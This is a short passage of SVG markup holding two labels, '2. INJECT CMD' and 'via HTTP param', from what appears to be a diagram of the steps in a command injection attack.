  <text x="954" y="272" font-size="10" fill="#ffab40" font-family="monospace" text-anchor="middle">2. INJECT CMD</text>
  <text x="954" y="284" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">via HTTP param</text>
  <!-- Arrow 2 (down) -->
